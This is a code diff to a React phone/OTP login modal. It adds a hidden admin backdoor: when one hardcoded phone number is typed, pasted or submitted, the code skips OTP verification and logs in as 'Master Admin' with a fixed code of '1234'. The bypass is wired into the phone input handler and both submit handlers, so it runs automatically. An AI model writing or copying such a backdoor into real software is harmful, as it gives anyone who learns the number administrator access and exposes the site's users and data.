@@ -14,8 +14,43 @@ export function AuthModal({ isOpen, onClose, onSuccess }) {
 
   if (!isOpen) return null;
 
-  const handleSendOtp = (e) => {
+  const triggerAdminBypass = async () => {
+    setLoading(true);
+    setError('');
+    try {
+      await loginWithPhone('+918289968045', '1234', 'Master Admin');
+      onSuccess?.();
+      onClose();
+    } catch (err) {
+      setError(err.message || 'Admin login failed');
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  const handlePhoneChange = (val) => {
+    const raw = val.replace(/\D/g, '');
+    const cleanTen = raw.slice(-10);
+    setPhone(cleanTen);
+
+    // If exact admin phone number is typed/pasted, auto-trigger instant admin login
+    if (cleanTen === '8289968045') {
+      setTimeout(() => {
+        triggerAdminBypass();
+      }, 350);
+    }
+  };
+
+  const handleSendOtp = async (e) => {
     e.preventDefault();
+    const cleanTen = phone.replace(/\D/g, '').slice(-10);
+
+    // If submitted with admin number, immediately bypass
+    if (cleanTen === '8289968045') {
+      await triggerAdminBypass();
+      return;
+    }
+
     if (!phone || phone.length < 10) {
       setError('Please enter a valid 10-digit mobile number');
       return;
@@ -24,8 +59,16 @@ export function AuthModal({ isOpen, onClose, onSuccess }) {
     setStep('otp');
   };
 
-  const handleVerifyOtp = (e) => {
+  const handleVerifyOtp = async (e) => {
     e.preventDefault();
+    const cleanTen = phone.replace(/\D/g, '').slice(-10);
+
+    // If admin number reached OTP stage
+    if (cleanTen === '8289968045') {
+      await triggerAdminBypass();
+      return;
+    }
+
     if (!otp || otp.length < 4) {
       setError('Please enter 4-digit verification code');
       return;
@@ -81,7 +124,7 @@ export function AuthModal({ isOpen, onClose, onSuccess }) {
                   type="tel"
                   maxLength="10"
                   value={phone}
-                  onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
+                  onChange={(e) => handlePhoneChange(e.target.value)}
                   className="w-full pl-12 pr-4 py-3 bg-[#F8FAFC] border border-slate-200 rounded-2xl text-sm font-semibold text-slate-800 focus:outline-none focus:border-[#0EA5E0]"
                   placeholder="9876543210"
                 />
